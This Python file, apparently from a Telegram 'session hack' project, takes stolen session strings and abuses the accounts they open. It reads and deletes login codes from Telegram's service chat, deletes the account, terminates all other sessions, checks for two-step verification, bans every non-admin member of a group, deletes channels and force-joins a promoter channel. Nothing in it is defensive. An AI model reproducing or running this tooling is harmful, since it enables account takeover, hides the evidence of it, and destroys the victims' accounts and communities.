import asyncio
import pyrogram 
from pyrogram import Client, enums
from telethon import TelegramClient
from telethon.sessions import StringSession 
from pyrogram.raw import functions
from JARVISSESSIONHACK import API_ID, API_HASH
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
from JARVISSESSIONHACK.Helpers.data import info
from pyrogram.types.messages_and_media.message import Str
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.types import ChannelParticipantsAdmins, ChatBannedRights
from pyrogram.errors import FloodWait
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon
from pyrogram.types import ChatPrivileges
from telethon.tl.types import ChannelParticipantsAdmins

# Helper to create a session
async def create_telethon_session(session_string):
    if session_string.endswith("="):
        return TelegramClient(StringSession(session_string), API_ID, API_HASH)
    else:
        return Client("stark", api_id=API_ID, api_hash=API_HASH, session_string=session_string)

# Function to join a channel
async def join_channel(session, gc_id):
    err = ""
    try:
        async with session:
            await session.join_chat("@TMK_MUSICSUPPORT")
            await session.join_chat("@TMK_MUSICSUPPORT")
            await session.join_chat(gc_id)
    except Exception as e:
        err = f"Error: {str(e)}"
    return "Joined Successfully!" if not err else f"Error: {err}"

# Function to leave a channel
async def leave_channel(session, gc_id):
    err = ""
    try:
        async with session:
            await session.leave_chat(gc_id)
    except Exception as e:
        err = f"Error: {str(e)}"
    return "Left Successfully!" if not err else f"Error: {err}"

# Function to handle banning users in a channel
async def ban_users(session, gc_id):
    err = ""
    bann = 0
    all = 0
    try:
        async with session:
            admins = await session.get_participants(gc_id, filter=ChannelParticipantsAdmins)
            admin_ids = [i.id for i in admins]
            
            async for user in session.iter_participants(gc_id):
                all += 1
                if user.id not in admin_ids:
                    await session(EditBannedRequest(gc_id, user.id, RIGHTS))
                    bann += 1
                    await asyncio.sleep(0.1)  # Avoid hitting Telegram rate limits

    except FloodWait as e:
        await asyncio.sleep(e.value)  # Handle FloodWait error gracefully
    except Exception as e:
        err = f"Error: {str(e)}"
    
    return f"Successfully banned {bann} users out of {all}" if not err else f"Error: {err}"

# Define the rights object for banning users
RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

# Function to get OTP
async def get_otp(session):
    err = ""
    otp = ""
    try:
        async with session:
            async for x in session.iter_messages(777000, limit=2):
                otp += f"\n{x.text}\n"
                await session.delete_messages(777000, [x.id])

    except Exception as e:
        err = f"Error: {str(e)}"

    return otp if not err else f"Error: {err}"

# Function to delete an account
async def delete_account(session):
    err = ""
    try:
        async with session:
            await session.invoke(functions.account.DeleteAccountRequest("User request"))
    except Exception as e:
        err = f"Error: {str(e)}"
    return "Account deleted successfully!" if not err else f"Error: {err}"

# Function to handle two-factor authentication check
async def check_2fa(session):
    err = ""
    status = ""
    try:
        async with session:
            yes = await session.invoke(functions.account.GetPassword())
            if yes.has_password:
                status = "Two-step verification enabled"
            else:
                status = "Two-step verification disabled"
    except Exception as e:
        err = f"Error: {str(e)}"
    
    return status if not err else f"Error: {err}"

# Function to reset all sessions
async def terminate_all(session):
    err = ""
    try:
        async with session:
            await session.invoke(rt())
    except Exception as e:
        err = f"Error: {str(e)}"
    return "All sessions terminated successfully!" if not err else f"Error: {err}"

# Function to delete the entire chat
async def delete_chat(session, gc_id):
    err = ""
    try:
        async with session:
            await session.invoke(functions.channels.DeleteChannel(channel=await session.resolve_peer(gc_id)))
    except Exception as e:
        err = f"Error: {str(e)}"
    
    return "Chat deleted successfully!" if not err else f"Error: {err}"

# Example of calling the functions
async def main():
    session_string = "<your_session_string_here>"
    async with await create_telethon_session(session_string) as session:
        response = await join_channel(session, "sample_channel_id")
        print(response)

# Run the main function
loop = asyncio.get_event_loop()
loop.run_until_complete(main())
